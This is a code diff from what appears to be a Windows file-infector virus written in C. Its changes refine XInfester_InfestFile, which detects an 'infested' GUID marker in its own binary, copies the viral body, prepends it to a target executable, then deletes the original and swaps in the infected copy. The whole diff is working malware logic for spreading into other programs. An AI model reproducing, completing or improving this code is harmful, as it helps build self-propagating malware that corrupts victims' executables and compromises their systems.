@@ -19,6 +19,7 @@ const char *GetLocalAppFilename()
 	return FileName;
 }
 
+
 const char *GetLocalAppInfestedFilename()
 {
 	static char FileName[MAX_PATH+1]= {0};
@@ -267,17 +268,49 @@ BOOL XInfester_InfestFile( const char *pDestFileName )
 	}
 
 	//Copy local to a NewFile
-	while (!feof(Selffp))
-	{
-		size_t ReadSize;
-		ReadSize=fread(Buffer,1,sizeof(Buffer),Selffp);
+	XINFESTED_FLAG inf;
+	fseek(Selffp,-(int)(sizeof(XINFESTED_FLAG)),SEEK_END);
 
-		if (ReadSize)
+	if(!fread(&inf,sizeof(XINFESTED_FLAG),1,Selffp))
+		goto ERR;
+
+	fseek(Selffp,0,SEEK_SET);
+
+	if (strcmp(inf.GUIDs,XINFESTED_FLAG_GUIDS_STRING)==0)
+	{
+		//Self is infested
+		SelfFileSize=inf.ResourceOffset;
+		int Ws=SelfFileSize;
+		while (Ws>0)
 		{
-			if(!fwrite(Buffer,ReadSize,1,Finalfp))
-				goto ERR;
+			size_t ReadSize;
+			ReadSize=fread(Buffer,1,sizeof(Buffer),Selffp);
+
+			if (ReadSize)
+			{
+				if(!fwrite(Buffer,ReadSize,1,Finalfp))
+					goto ERR;
+			}
+			Ws-=ReadSize;
+		}
+		
+	}
+	else
+	{
+		while (!feof(Selffp))
+		{
+			size_t ReadSize;
+			ReadSize=fread(Buffer,1,sizeof(Buffer),Selffp);
+
+			if (ReadSize)
+			{
+				if(!fwrite(Buffer,ReadSize,1,Finalfp))
+					goto ERR;
+			}
 		}
 	}
+
+	
 
 	//Copy dest to new file
 	while (!feof(Destfp))
@@ -304,14 +337,14 @@ BOOL XInfester_InfestFile( const char *pDestFileName )
 		fclose(Selffp);
 		fclose(Finalfp);
 
-	
+	/*
 	//Strip ICON
 	HICON ico=GetExecICON(pDestFileName);
 	if (ico!=NULL)
 	{
 		SaveIcon(ico,"ICO.ico");
 	}
-
+	*/
 	DeleteFile(pDestFileName);
 	CopyFileA("TEMP",pDestFileName,FALSE);
 	DeleteFile("TEMP");
